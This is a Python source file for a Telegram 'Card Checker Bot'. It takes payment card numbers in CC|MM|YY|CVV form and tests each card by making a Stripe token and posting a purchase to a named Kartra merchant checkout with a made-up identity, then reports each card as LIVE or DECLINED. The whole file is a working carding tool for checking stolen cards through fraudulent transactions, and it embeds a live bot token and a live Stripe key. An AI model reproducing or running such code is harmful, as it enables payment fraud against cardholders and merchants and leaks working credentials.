import telebot
import requests
import random
import string
import time
import re

BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_URL = "https://api.stripe.com/v1/tokens"
KARTRA_SIGNUP_URL = "https://kymtolson.kartra.com/checkout/createCheckoutLeadFirstStep/"
KARTRA_PURCHASE_URL = "https://kymtolson.kartra.com/checkout/purchase_product/"

def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvc = map(str.strip, parts)
    if not (cc.isdigit() and mm.isdigit() and cvc.isdigit() and (len(yy) in [2,4])):
        return None
    if len(yy) == 2:
        yy = "20" + yy
    return cc, mm.zfill(2), yy[-2:], cvc

def get_kartra_token(session):
    response = session.get(KARTRA_SIGNUP_URL)
    match = re.search(r'name="_token"\s+value="([^"]+)"', response.text)
    return match.group(1) if match else None

def create_stripe_token(cc, mm, yy, cvc):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    
    data = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvc,
        "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "payment_user_agent": "stripe.js/78ef418",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": "pk_live_51Jhet4HYghhmd4CamObYqu2qaPmZlp3SqgYcBfUbKrgBBnS040UHuHvzuHxl7I4GQwFXEwjAx62BQu01Q76BRmum00dZ72P1K2"
    }
    
    response = requests.post(STRIPE_URL, data=data, headers=headers)
    return response.json().get('id')

def process_card(cc, mm, yy, cvc):
    session = requests.Session()
    email = generate_random_email()
    
    try:
        # Get Kartra token
        kartra_token = get_kartra_token(session)
        if not kartra_token:
            return "❌ Failed to get Kartra token"
            
        # Create Stripe token
        stripe_token = create_stripe_token(cc, mm, yy, cvc)
        if not stripe_token:
            return "❌ Stripe token creation failed"
            
        # Submit purchase
        data = {
            "_token": kartra_token,
            "first_name": "Peshang",
            "last_name": "Salam",
            "email": email,
            "email_confirmation": email,
            "address": "198 White Horse Pike",
            "city": "West Collingswood",
            "zip": "08107",
            "country": "USA",
            "state": "18650",
            "card_number": cc,
            "card_exp_month": mm,
            "card_exp_year": yy,
            "CVV": cvc,
            "stripe_token": stripe_token,
            "gdpr_terms": "1",
            "payment_data": "..."  # Add actual payment_data if needed
        }
        
        response = session.post(KARTRA_PURCHASE_URL, data=data)
        return f"Card: {cc}|{mm}|{yy}|{cvc}\nEmail: {email}\nStatus: {'❌ DECLINED' if 'declined' in response.text.lower() else '✅ LIVE'}\nResponse: {response.text}"
        
    except Exception as e:
        return f"⚠️ Error processing card: {str(e)}"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV\n"
        "CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "4242424242424242|12|25|123\n"
        "5108750563572478|09|2029|456"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_line in cards:
        parsed = parse_card_input(card_line)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
            continue
            
        cc, mm, yy, cvc = parsed
        result = process_card(cc, mm, yy, cvc)
        bot.send_message(message.chat.id, result)
        time.sleep(10)  # 10-second delay between checks

bot.infinity_polling()